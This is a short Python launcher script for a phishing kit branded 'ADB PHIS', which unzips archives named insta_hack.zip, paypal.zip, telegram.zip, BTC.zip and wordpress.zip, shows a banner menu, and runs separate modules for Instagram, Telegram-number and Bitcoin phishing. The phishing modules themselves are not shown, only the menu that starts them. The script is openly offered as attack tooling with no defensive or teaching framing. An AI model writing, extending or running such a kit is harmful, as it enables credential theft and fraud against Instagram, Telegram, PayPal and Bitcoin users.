import os
import pyfiglet
from colorama import Fore
os.system("unzip insta_hack.zip")
os.system("unzip wordpress.zip")
os.system("unzip paypal.zip")
os.system("unzip telegram.zip")
os.system("unzip BTC.zip")
os.system("clear")
out = pyfiglet.figlet_format("ADB PHIS", font="3-d")
print(Fore.WHITE+"*"*70)
print(Fore.RED+"""

  ___ ____________              _     _     _     _             
 / _ \|  _  \ ___ \            | |   (_)   | |   (_)            
/ /_\ \ | | | |_/ /______ _ __ | |__  _ ___| |__  _ _ __   __ _ 
|  _  | | | | ___ \______| '_ \| '_ \| / __| '_ \| | '_ \ / _` |
| | | | |/ /| |_/ /      | |_) | | | | \__ \ | | | | | | | (_| |
\_| |_/___/ \____/       | .__/|_| |_|_|___/_| |_|_|_| |_|\__, |
                         | |                               __/ |
                         |_|                              |___/ 
                                                                
""")
print(Fore.WHITE+"*"+Fore.GREEN+"[+]"+Fore.RED+"INSTAGRAM")
print(Fore.WHITE+"*"+Fore.GREEN+"[+]"+Fore.RED+"telenumber")
print(Fore.WHITE+"*"+Fore.GREEN+"[+]"+Fore.RED+"BTC")
print(Fore.WHITE+"*"*70)
s =input(Fore.RED+"="+Fore.GREEN+"telenumber/instagram"+Fore.RED+">")
if s == "instagram":
        os.system("python module2.py")
if s == "telenumber":
        os.system("python module1.py")
if s == "BTC":
        os.system("python module3.py")
